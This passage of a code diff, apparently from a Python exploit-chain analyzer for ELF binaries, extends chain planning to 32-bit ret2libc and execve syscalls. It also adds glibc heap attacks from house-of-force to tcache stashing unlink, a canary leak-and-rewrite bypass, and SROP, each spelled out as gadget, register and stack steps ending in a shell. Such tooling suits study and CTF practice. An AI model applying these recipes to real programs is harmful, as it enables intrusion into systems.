+    que un canary activo es su precondicion, no un bloqueo."""
     if c.unmet_requirements != 0:
         return False
-    if f.get("canary") is True:
+    if f.get("canary") is True and not allow_canary:
         return False
     return True
 
@@ -480,8 +889,10 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                  "(GOT/PLT, tcache, execve, '/bin/sh' strings) are glibc-specific and have no "
                  "equivalent here.")
         return ChainAnalysis(arch=f["arch"], applicable=False, note=note)
-    gadgets = _enum_gadgets(binary)
-    an = ChainAnalysis(arch=f["arch"], gadgets=gadgets)
+    _bits = 32 if _is32(f.get("arch")) else 64
+    gadgets = _enum_gadgets(binary, bits=_bits)
+    _arsenal = _full_arsenal(binary, gadgets, f)
+    an = ChainAnalysis(arch=f["arch"], gadgets=gadgets, arsenal=_arsenal)
     # bad-chars gobernados por el sink de entrada (no-PIE: direcciones fijas comprobables)
     _sink = _overflow_sink(binary)
     _badset = _SINK_BADCHARS.get(_sink, set()) if (_sink and f.get("pie") is not True) else set()
@@ -568,59 +979,99 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
         c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2win", f, lang)
     chains.append(c)
 
-    # 2) ret2libc: overflow -> pop rdi; ret -> system('/bin/sh')
-    c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
-    g_rdi = _best_for(gadgets, "rdi")
+    # 2) ret2libc -> system('/bin/sh').
+    #    64b: pop rdi=&/bin/sh (SysV: 1er arg en RDI); ret -> system.
+    #    32b (cdecl): los argumentos van en la PILA, NO en registros -> no hace falta `pop`;
+    #        se coloca [system][retorno_falso][&/bin/sh] directamente tras la direccion de retorno.
     has_sys, has_binsh = f.get("system") is not None, f.get("binsh") is not None
-    c.requirements = [
-        _req(rip, "control de RIP", "RIP control", lang),
-        _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
-        _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
-        _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
-    c.regs_needed = ["rdi"]
-    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
-    if g_rdi:
-        c.gadgets_used = [g_rdi.addr]
-        if g_rdi.clobbers:
-            c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
-                                 + ", ".join(g_rdi.clobbers))
-        if g_rdi.side_effects:
-            c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
-                                 + g_rdi.side_effects)
-    c.steps = [
-        ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
-        ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
-        ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
-                  addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
-                  stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
-                  constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
-                               else L("gadget ausente", "gadget absent"))),
-        ChainStep("target", "system('/bin/sh')",
-                  (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
-                   else L("requiere system()", "requires system()")),
-                  addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
-    _apply_badchars(c, [a for a in [g_rdi.addr if g_rdi else None, f.get("system"), f.get("binsh")] if a],
-                    _badset, _sink, lang)
+    if _bits == 32:
+        c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
+            _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
+        c.regs_needed = []     # cdecl: argumentos en la pila, sin gadgets de registro
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.constraints.append(L(
+            "cdecl x86-32: el argumento va en la pila tras una direccion de retorno de 4B "
+            "(usa `exit` o un gadget `ret` como retorno falso para salir limpio)",
+            "x86-32 cdecl: the argument sits on the stack after a 4B return address "
+            "(use `exit` or a `ret` gadget as the fake return for a clean exit)"))
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("primitive", ripc, regs={"eip": L("controlado", "controlled")}),
+            ChainStep("gadget", "layout de pila (cdecl)",
+                      L("[system][ret_falso][&'/bin/sh'] colocados tras EIP",
+                        "[system][fake_ret][&'/bin/sh'] placed after EIP"),
+                      stack=L("arg1 = &'/bin/sh' en [esp+4] al entrar en system",
+                              "arg1 = &'/bin/sh' at [esp+4] on entry to system")),
+            ChainStep("target", "system('/bin/sh')",
+                      (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
+                       else L("requiere system()", "requires system()")),
+                      addr=f.get("system"))]
+        _apply_badchars(c, [a for a in [f.get("system"), f.get("binsh")] if a], _badset, _sink, lang)
+    else:
+        c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
+        g_rdi = _best_for(gadgets, "rdi")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
+            _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
+            _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
+        c.regs_needed = ["rdi"]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        if g_rdi:
+            c.gadgets_used = [g_rdi.addr]
+            if g_rdi.clobbers:
+                c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
+                                     + ", ".join(g_rdi.clobbers))
+            if g_rdi.side_effects:
+                c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
+                                     + g_rdi.side_effects)
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
+            ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
+                      addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
+                      stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
+                      constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
+                                   else L("gadget ausente", "gadget absent"))),
+            ChainStep("target", "system('/bin/sh')",
+                      (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
+                       else L("requiere system()", "requires system()")),
+                      addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
+        _apply_badchars(c, [a for a in [g_rdi.addr if g_rdi else None, f.get("system"), f.get("binsh")] if a],
+                        _badset, _sink, lang)
     _score(c)
     if verify and _should_attempt_verify(c, f):
         c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc", f, lang)
     chains.append(c)
 
-    # 3) execve por syscall: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall
+    # 3) execve por syscall. 64b: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall.
+    #    32b: pop eax=11; pop ebx=&/bin/sh; pop ecx=0; pop edx=0; int 0x80.
+    _a3 = _arg_regs(_bits)[:3]              # (rdi,rsi,rdx) o (ebx,ecx,edx)
+    _accr = _acc(_bits)                     # rax o eax
+    _syscall_insn = "int 0x80" if _bits == 32 else "syscall"
+    _execve_num = _SYS_EXECVE_32 if _bits == 32 else _SYS_EXECVE
+    _order = [_accr] + _a3                  # el acumulador (numero) + los 3 args
     c = ExploitChain(name="execve syscall", target="execve('/bin/sh',0,0)")
-    need = {"rax": _best_for(gadgets, "rax"), "rdi": _best_for(gadgets, "rdi"),
-            "rsi": _best_for(gadgets, "rsi"), "rdx": _best_for(gadgets, "rdx")}
+    need = {rn: _best_for(gadgets, rn) for rn in _order}
     g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
     has_binsh = f.get("binsh") is not None
     c.requirements = [_req(rip, "control de RIP", "RIP control", lang)]
-    for rname in ("rax", "rdi", "rsi", "rdx"):
+    for rname in _order:
         c.requirements.append(_req(bool(need[rname]), f"gadget `pop {rname}; ret`", f"gadget `pop {rname}; ret`", lang))
-    c.requirements.append(_req(bool(g_sys), "gadget `syscall`", "gadget `syscall`", lang))
+    c.requirements.append(_req(bool(g_sys), f"gadget `{_syscall_insn}`", f"gadget `{_syscall_insn}`", lang))
     c.requirements.append(_req(has_binsh, "cadena '/bin/sh' (o escribible en .bss)",
                                "'/bin/sh' string (or writable in .bss)", lang))
-    c.regs_needed = ["rax", "rdi", "rsi", "rdx"]
+    c.regs_needed = list(_order)
     c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
     c.gadgets_used = [g.addr for g in list(need.values()) + [g_sys] if g]
+    # RAZONAMIENTO arsenal -> cadena: conecta lo detectado en el arsenal (ret2csu, one_gadget) con
+    # los huecos de esta cadena execve-por-syscall (pops de los 2 ultimos args que falten).
+    _missing_args = [r for r in _a3[1:] if not need[r]]
+    for note_es, note_en in _execve_arsenal_notes(_missing_args, _arsenal):
+        c.constraints.append(L(note_es, note_en))
     for rname, g in need.items():
         if g and g.clobbers:
             other = [x for x in g.clobbers if x in c.regs_needed and x != rname]
@@ -629,9 +1080,9 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                                        f"clobber conflict in pop {rname}: destroys {', '.join(other)}"))
     c.steps = [ChainStep("vuln", ovf),
                ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")})]
-    vals = {"rax": L("59 (execve)", "59 (execve)"), "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"}
+    vals = {_accr: f"{_execve_num} (execve)", _a3[0]: "&'/bin/sh'", _a3[1]: "0", _a3[2]: "0"}
     setregs = {}
-    for rname in ("rax", "rdi", "rsi", "rdx"):
+    for rname in _order:
         g = need[rname]
         setregs = dict(setregs); setregs[rname] = vals[rname]
         c.steps.append(ChainStep("gadget", f"pop {rname}; ret", g.text if g else L("AUSENTE", "ABSENT"),
@@ -639,7 +1090,7 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
                                  stack=f"delta={g.stack_delta}B" if g else "",
                                  constraints=((g.side_effects or L("limpio", "clean")) if g
                                               else L("gadget ausente", "gadget absent"))))
-    c.steps.append(ChainStep("target", "syscall -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
+    c.steps.append(ChainStep("target", f"{_syscall_insn} -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
                              addr=g_sys.addr if g_sys else None, regs=dict(setregs)))
     _apply_badchars(c, [g.addr for g in list(need.values()) + [g_sys] if g]
                     + ([f["binsh"]] if f.get("binsh") else []), _badset, _sink, lang)
@@ -653,35 +1104,67 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
     #    para llamar system('/bin/sh'). Solo tiene sentido si NO hay una via mas simple (win/system).
     if f.get("puts") and f.get("system") is None and f.get("win") is None:
         c = ExploitChain(name="ret2libc + leak", target="system('/bin/sh') via libc")
-        g_rdi = _best_for(gadgets, "rdi")
         lk = f.get("leak_fn") or "puts"
-        c.requirements = [
-            _req(rip, "control de RIP", "RIP control", lang),
-            _req(bool(g_rdi), "gadget `pop rdi; ret`", "gadget `pop rdi; ret`", lang),
-            _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
-            _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
-                 "reentry point (main/vuln) for stage 2", lang),
-            _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
-                 "target libc (system and '/bin/sh' offsets)", lang)]
-        c.regs_needed = ["rdi"]
-        c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)  # direcciones de libc en runtime
-        if g_rdi:
-            c.gadgets_used = [g_rdi.addr]
-        c.steps = [
-            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
-            ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
-            ChainStep("gadget", f"[fase 1] pop rdi; {lk}@PLT",
-                      L(f"filtra {lk}@GOT para calcular la base de libc y reentra en main",
-                        f"leaks {lk}@GOT to compute the libc base and reenters main"),
-                      addr=g_rdi.addr if g_rdi else None,
-                      regs={"rdi": f"{lk}@GOT"}, stack=L("reentra: 2a etapa", "reenter: stage 2"),
-                      constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
-            ChainStep("gadget", "[fase 2] pop rdi; system",
-                      L("con la base de libc: rdi=&'/bin/sh', llama a system", "with libc base: rdi=&'/bin/sh', call system"),
-                      regs={"rdi": "&'/bin/sh' (libc)"} ),
-            ChainStep("target", "system('/bin/sh')",
-                      L("shell via libc rebaseada", "shell via rebased libc"),
-                      regs={"rip": "system@libc"})]
+        if _bits == 32:
+            # x86-32 cdecl: el leak es `puts@plt; reentry; puts@GOT` (arg en la pila, sin `pop`).
+            c.requirements = [
+                _req(rip, "control de RIP", "RIP control", lang),
+                _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
+                _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
+                     "reentry point (main/vuln) for stage 2", lang),
+                _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
+                     "target libc (system and '/bin/sh' offsets)", lang)]
+            c.regs_needed = []
+            c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)
+            c.constraints.append(L(
+                "cdecl x86-32: argumentos en la pila; el leak es [{0}@plt][reentry][{0}@GOT] y la "
+                "2a etapa [system][exit][&'/bin/sh'] -- sin gadgets `pop`".format(lk),
+                "x86-32 cdecl: stack args; the leak is [{0}@plt][reentry][{0}@GOT] and stage 2 is "
+                "[system][exit][&'/bin/sh'] -- no `pop` gadgets".format(lk)))
+            c.steps = [
+                ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+                ChainStep("primitive", ripc, regs={"eip": L("controlado", "controlled")}),
+                ChainStep("gadget", f"[fase 1] {lk}@PLT( {lk}@GOT )",
+                          L(f"filtra {lk}@GOT (en la pila) para calcular la base de libc y reentra",
+                            f"leaks {lk}@GOT (on the stack) to compute the libc base and reenters"),
+                          stack=L("[{0}@plt][reentry][{0}@GOT]".format(lk), "[{0}@plt][reentry][{0}@GOT]".format(lk)),
+                          constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
+                ChainStep("gadget", "[fase 2] system (cdecl)",
+                          L("con la base de libc: [system][exit][&'/bin/sh'] en la pila",
+                            "with libc base: [system][exit][&'/bin/sh'] on the stack"),
+                          stack="[system][exit][&'/bin/sh']"),
+                ChainStep("target", "system('/bin/sh')",
+                          L("shell via libc rebaseada", "shell via rebased libc"),
+                          regs={"eip": "system@libc"})]
+        else:
+            g_rdi = _best_for(gadgets, "rdi")
+            c.requirements = [
+                _req(rip, "control de RIP", "RIP control", lang),
+                _req(bool(g_rdi), "gadget `pop rdi; ret`", "gadget `pop rdi; ret`", lang),
+                _req(f.get("puts"), f"`{lk}` en PLT/GOT (para filtrar libc)", f"`{lk}` in PLT/GOT (to leak libc)", lang),
+                _req(f.get("reenter"), "punto de reentrada (main/vuln) para la 2a etapa",
+                     "reentry point (main/vuln) for stage 2", lang),
+                _req(True, "libc del objetivo (offsets de system y '/bin/sh')",
+                     "target libc (system and '/bin/sh' offsets)", lang)]
+            c.regs_needed = ["rdi"]
+            c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)  # direcciones de libc en runtime
+            if g_rdi:
+                c.gadgets_used = [g_rdi.addr]
+            c.steps = [
+                ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+                ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
+                ChainStep("gadget", f"[fase 1] pop rdi; {lk}@PLT",
+                          L(f"filtra {lk}@GOT para calcular la base de libc y reentra en main",
+                            f"leaks {lk}@GOT to compute the libc base and reenters main"),
+                          addr=g_rdi.addr if g_rdi else None,
+                          regs={"rdi": f"{lk}@GOT"}, stack=L("reentra: 2a etapa", "reenter: stage 2"),
+                          constraints=L("necesita la libc exacta para los offsets", "needs the exact libc for offsets")),
+                ChainStep("gadget", "[fase 2] pop rdi; system",
+                          L("con la base de libc: rdi=&'/bin/sh', llama a system", "with libc base: rdi=&'/bin/sh', call system"),
+                          regs={"rdi": "&'/bin/sh' (libc)"} ),
+                ChainStep("target", "system('/bin/sh')",
+                          L("shell via libc rebaseada", "shell via rebased libc"),
+                          regs={"rip": "system@libc"})]
         _score(c)
         if verify and _should_attempt_verify(c, f):
             c.sim_result, c.verified, c.proof = _verify_chain(binary, "ret2libc_leak", f, lang)
@@ -853,6 +1336,271 @@ def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es"
             c.sim_result, c.verified, c.proof = _verify_chain(binary, "tcache_dup", f, lang)
         chains.append(c)
 
+    # 10b) familias de heap modernas con verificador dedicado (house-of-force/spirit/einherjar/
+    # botcake, largebin attack y tcache-stashing-unlink). Son de forma de practica: el overflow/
+    # corrupcion aterriza un chunk (o una escritura de puntero) en un objetivo elegido -> se hijackea
+    # un puntero de funcion -> shell. Antes eran verificadores sueltos (autohof/autohos/...); aqui se
+    # exponen como CADENAS del grafo y, con verify=True, se ejecutan en el sandbox (ASLR off, forma
+    # de practica). Cada una resuelve el chequeo de glibc que la mitiga (o lo reproduce en el binario).
+    _HEAP_FAMILIES = [
+        ("hof_ok", "hof", "house-of-force",
+         L("Top-chunk corrompible (overflow en el chunk superior)", "Corruptible top chunk (overflow into the wrap chunk)"),
+         L("se sobrescribe el tamano del top chunk con un valor enorme; una peticion 'huge' (con "
+           "wraparound) mueve `top` a &handler; glibc>=2.29 chequea el tamano del top -> reproducido "
+           "en el asignador del binario", "overwrite the top-chunk size with a huge value; a 'huge' "
+           "request (with wraparound) moves `top` to &handler; glibc>=2.29 checks the top size -> "
+           "reproduced in the binary's allocator")),
+        ("hos_ok", "hos", "house-of-spirit",
+         L("Chunk falso liberado al tcache", "Fake chunk freed into the tcache"),
+         L("se forja un chunk falso en memoria controlada y se libera: entra al tcache de glibc real "
+           "(verificado en 2.39); el siguiente malloc lo devuelve -> escritura sobre &handler",
+           "forge a fake chunk in controlled memory and free it: it enters the real glibc tcache "
+           "(verified on 2.39); the next malloc returns it -> write over &handler")),
+        ("hoe_ok", "hoe", "house-of-einherjar",
+         L("Consolidacion hacia atras (prev_size forjado + PREV_INUSE limpio)", "Backward consolidation (forged prev_size + cleared PREV_INUSE)"),
+         L("al liberar, la consolidacion hacia atras fusiona con un chunk falso en &handler-0x10; el "
+           "siguiente malloc devuelve &handler -> escritura -> hijack",
+           "on free, backward consolidation merges with a fake chunk at &handler-0x10; the next "
+           "malloc returns &handler -> write -> hijack")),
+        ("botcake_ok", "botcake", "house-of-botcake",
+         L("Doble-free enrutado por la unsorted bin", "Double-free routed through the unsorted bin"),
+         L("consolidar dos chunks en la unsorted bin limpia la `key` del tcache, permitiendo un "
+           "doble-free que solapa chunks; se envenena el fd (safe-linked) hacia &handler. glibc real "
+           "2.39", "consolidating two chunks through the unsorted bin clears the tcache `key`, "
+           "enabling a double-free that overlaps chunks; poison the (safe-linked) fd toward "
+           "&handler. real glibc 2.39")),
+        ("largebin_ok", "largebin", "largebin attack",
+         L("bk_nextsize corrupto en una largebin", "Corrupted bk_nextsize in a largebin"),
+         L("una insercion en largebin con bk_nextsize corrupto ejecuta "
+           "`victim->bk_nextsize->fd_nextsize = victim`: escritura de puntero arbitraria -> `slot` "
+           "apunta a un chunk controlado -> hijack. glibc>=2.30 añade un chequeo -> reproducido",
+           "a largebin insertion with a corrupted bk_nextsize runs "
+           "`victim->bk_nextsize->fd_nextsize = victim`: arbitrary pointer write -> `slot` points at "
+           "a controlled chunk -> hijack. glibc>=2.30 adds a check -> reproduced")),
+        ("homind_ok", "homind", "house-of-mind",
+         L("ar_ptr de heap_info corrompido (seleccion de arena)", "Corrupted heap_info ar_ptr (arena selection)"),
+         L("free() toma la arena de heap_for_ptr(p)->ar_ptr; con ar_ptr falso, la insercion en "
+           "fastbin `arena->fastbinsY[idx]=chunk` escribe en una direccion elegida -> hijack",
+           "free() takes the arena from heap_for_ptr(p)->ar_ptr; with a forged ar_ptr, the fastbin "
+           "insertion `arena->fastbinsY[idx]=chunk` writes to a chosen address -> hijack")),
+        ("fsop_ok", "fsop", "IO_FILE/FSOP",
+         L("vtable de _IO_FILE reapuntada", "Repointed _IO_FILE vtable"),
+         L("se sobrescribe fp->vtable a una vtable falsa; la operacion de flujo llama "
+           "`vtable->__overflow(fp)` (vtable+0x18) = puntero del atacante -> control de flujo",
+           "overwrite fp->vtable to a fake vtable; the stream op calls `vtable->__overflow(fp)` "
+           "(vtable+0x18) = attacker pointer -> control flow")),
+        ("fastdup_ok", "fastdup", "fastbin-dup",
+         L("Doble-free en fastbin (A,B,A esquiva el chequeo ==fasttop)", "Fastbin double-free (A,B,A slips the ==fasttop check)"),
+         L("tras el doble-free se envenena fd hacia un chunk falso (con size valido); una alloc "
+           "posterior devuelve esa direccion -> hijack. Fastbin clasico pre-2.32 (sin safe-linking)",
+           "after the double-free, fd is poisoned toward a fake chunk (with a valid size); a later "
+           "alloc returns that address -> hijack. Classic pre-2.32 fastbin (no safe-linking)")),
+        ("unlink_ok", "unlink", "unsafe-unlink",
+         L("unlink() de un chunk con fd/bk forjados", "unlink() of a chunk with forged fd/bk"),
+         L("fd=&ptr-0x18, bk=&ptr-0x10 satisfacen el chequeo 2.3.4+ (`FD->bk==P && BK->fd==P`) y "
+           "unlink deja ptr=&ptr-0x18; editar a traves de ptr redirige ptr a &handler y luego "
+           "escribe win -> hijack", "fd=&ptr-0x18, bk=&ptr-0x10 satisfy the 2.3.4+ check "
+           "(`FD->bk==P && BK->fd==P`) and unlink leaves ptr=&ptr-0x18; editing through ptr "
+           "redirects ptr to &handler and then writes win -> hijack")),
+        ("hoc_ok", "hoc", "house-of-corrosion",
+         L("global_max_fast corrompido (free grande tratado como fastbin)", "Corrupted global_max_fast (a large free treated as a fastbin free)"),
+         L("con global_max_fast enorme, free() indexa `fastbinsY[(size-0x20)>>4]` sin cota: un "
+           "`size` elegido alias-a una direccion arbitraria y la insercion escribe &chunk ahi -> "
+           "hijack. glibc real encadena hacia _IO_list_all/stdout -> reproducido en el binario",
+           "with a huge global_max_fast, free() indexes `fastbinsY[(size-0x20)>>4]` unbounded: a "
+           "chosen `size` aliases an arbitrary address and the insertion writes &chunk there -> "
+           "hijack. real glibc chains it into _IO_list_all/stdout -> reproduced in the binary")),
+        ("stash_ok", "stash", "tcache stashing unlink",
+         L("Stash de smallbin->tcache con bk corrupto", "Smallbin->tcache stash with a corrupted bk"),
+         L("al servir de la smallbin con hueco en el tcache, glibc 'stashea' los restantes; con un "
+           "bk corrupto, un chunk FALSO entra al tcache y el siguiente alloc devuelve una direccion "
+           "elegida. Satisface el chequeo >=2.31 `bck->fd==tc_victim` (disparo via calloc)",
+           "when serving from the smallbin with tcache room, glibc stashes the rest; with a "
+           "corrupted bk a FAKE chunk enters the tcache and the next alloc returns a chosen address. "
+           "Satisfies the >=2.31 `bck->fd==tc_victim` check (calloc trigger)")),
+    ]
+    for _flag, _kind, _name, _vuln, _prim in _HEAP_FAMILIES:
+        if not f.get(_flag):
+            continue
+        c = ExploitChain(name=_name, target="win() via hijacked function pointer")
+        c.requirements = [
+            _req(f.get("win") is not None, "funcion objetivo win() en el binario",
+                 "target function win() in the binary", lang),
+            _req(True, "forma de practica del heap (simbolos del asignador + puntero hijackeable)",
+                 "practice heap shape (allocator symbols + a hijackable pointer)", lang),
+            _req(f.get("pie") is not True, "objetivo en direccion fija (no-PIE, ASLR off en sandbox)",
+                 "target at a fixed address (non-PIE, ASLR off in the sandbox)", lang)]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, False, lang)
+        c.steps = [
+            ChainStep("vuln", _vuln, ""),
+            ChainStep("primitive", L("Primitiva de heap moderna", "Modern heap primitive"), _prim),
+            ChainStep("target", "win() via &handler",
+                      L("la asignacion controlada devuelve el puntero de funcion; se escribe win() "
+                        "ahi y el binario lo invoca -> shell",
+                        "the controlled allocation returns the function pointer; win() is written "
+                        "there and the binary invokes it -> shell"),
+                      addr=f.get("win"), regs={"rip": hex(f["win"]) if f.get("win") else "?"})]
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, _kind, f, lang)
+        chains.append(c)
+
+    # 11) bypass de stack canary: fuga del canary (via %s tras sobrescribir su LSB nulo) ->
+    # reescritura del mismo canary -> overflow hasta win(). Solo tiene sentido cuando el canary
+    # esta ACTIVO (si no, ret2win directo basta) y existe win(). A diferencia del resto de cadenas
+    # de overflow, esta NO queda bloqueada por el canary: su driver (autocanary) lo filtra y lo
+    # reescribe, de modo que el canary es su precondicion, no su punto de rotura.
+    if f.get("canary") is True and f.get("win") is not None:
+        c = ExploitChain(name="canary bypass", target="win()")
+        winaddr = f.get("win") or 0
+        c.requirements = [
+            _req(True, "stack canary ACTIVO (precondicion de esta tecnica)",
+                 "stack canary ON (precondition for this technique)", lang),
+            _req(True, "primitiva de fuga: un `%s`/eco del buffer desbordable que imprima tras "
+                 "sobrescribir el LSB nulo del canary",
+                 "leak primitive: a `%s`/echo of the overflowable buffer that prints after "
+                 "overwriting the canary's null LSB", lang),
+            _req(True, "funcion objetivo win()/giveshell en el binario",
+                 "target function win()/giveshell in the binary", lang)]
+        c.regs_needed = []
+        # el canary deja de ser un break_point para ESTA cadena (se filtra y reescribe)
+        c.mitigations, _ = _mitig_breakpoints(f, True, lang)
+        c.break_points = []
+        c.steps = [
+            ChainStep("vuln", ovf,
+                      L("se sobrescribe SOLO el LSB nulo del canary con un byte no nulo",
+                        "overwrite ONLY the canary's null LSB with a non-zero byte"),
+                      stack=L("el %s posterior continua e imprime los 7 bytes altos del canary",
+                              "the following %s keeps going and prints the upper 7 canary bytes")),
+            ChainStep("primitive", L("Fuga del canary", "Canary leak"),
+                      L("canary = 0x00 | (7 bytes filtrados); el LSB del canary de glibc es siempre 0x00",
+                        "canary = 0x00 | (7 leaked bytes); glibc's canary LSB is always 0x00"),
+                      regs={"canary": L("recuperado", "recovered")}),
+            ChainStep("gadget", "ret",
+                      L("slot `ret` opcional para alinear la pila a 16B si win() llama a system()",
+                        "optional `ret` slot to 16B-align the stack if win() calls system()")),
+            ChainStep("target", "win()",
+                      L(f"2do overflow: reescribe el MISMO canary (pasa la comprobacion), rellena "
+                        f"el rbp guardado y retorna a win() en {hex(winaddr)}",
+                        f"2nd overflow: rewrite the SAME canary (check passes), fill saved rbp and "
+                        f"return to win() at {hex(winaddr)}"),
+                      addr=winaddr or None, regs={"rip": hex(winaddr)})]
+        _apply_badchars(c, [f.get("win")] if f.get("win") else [], _badset, _sink, lang)
+        _score(c)
+        if verify and _should_attempt_verify(c, f, allow_canary=True):
+            c.sim_result, c.verified, c.proof = _verify_chain(binary, "canary", f, lang)
+        chains.append(c)
+
+    # 11b) SROP: binario no-PIE pobre en gadgets con `pop rax; ret` + un gadget `syscall` + una
+    # cadena '/bin/sh'. Un rt_sigreturn (RAX=15) restaura TODO el banco de registros desde un frame
+    # forjado -> execve('/bin/sh',0,0), sin necesitar pop rdi/rsi/rdx. Ruta natural cuando la
+    # cadena execve normal no puede fijar los registros de argumentos.
+    _g_rax = _best_for(gadgets, "rax")
+    _g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
+    if (not f.get("pie") and f.get("win") is None and f.get("binsh") is not None
+            and _g_rax and _g_sys):
+        c = ExploitChain(name="SROP", target="execve('/bin/sh',0,0) via sigreturn")
+        c.requirements = [
+            _req(rip, "control de RIP", "RIP control", lang),
+            _req(bool(_g_rax), "gadget `pop rax; ret` (RAX=15 sigreturn / 59 execve)",
+                 "gadget `pop rax; ret` (RAX=15 sigreturn / 59 execve)", lang),
+            _req(bool(_g_sys), "gadget `syscall`", "gadget `syscall`", lang),
+            _req(f.get("binsh") is not None, "cadena '/bin/sh' en el binario (direccion fija, no-PIE)",
+                 "'/bin/sh' string in the binary (fixed address, no-PIE)", lang)]
+        c.regs_needed = ["rax"]
+        c.gadgets_used = [g.addr for g in (_g_rax, _g_sys) if g]
+        c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
+        c.steps = [
+            ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
+            ChainStep("gadget", "pop rax; ret",
+                      (_g_rax.text if _g_rax else L("AUSENTE", "ABSENT")),
+                      addr=_g_rax.addr if _g_rax else None, regs={"rax": "15 (rt_sigreturn)"}),
+            ChainStep("gadget", "syscall",
+                      L("rt_sigreturn: el kernel restaura TODO el frame sigcontext desde la pila",
+                        "rt_sigreturn: the kernel restores the WHOLE sigcontext frame from the stack"),
+                      addr=_g_sys.addr if _g_sys else None),
+            ChainStep("target", "execve('/bin/sh',0,0)",
+                      L("el frame forjado fija RAX=59, RDI=&'/bin/sh', RSI=RDX=0, RIP=syscall",
+                        "the forged frame sets RAX=59, RDI=&'/bin/sh', RSI=RDX=0, RIP=syscall"),
+                      regs={"rax": "59", "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"})]
+        _apply_badchars(c, [g.addr for g in (_g_rax, _g_sys) if g] + [f.get("binsh")], _badset, _sink, lang)
+        _score(c)
+        if verify and _should_attempt_verify(c, f):
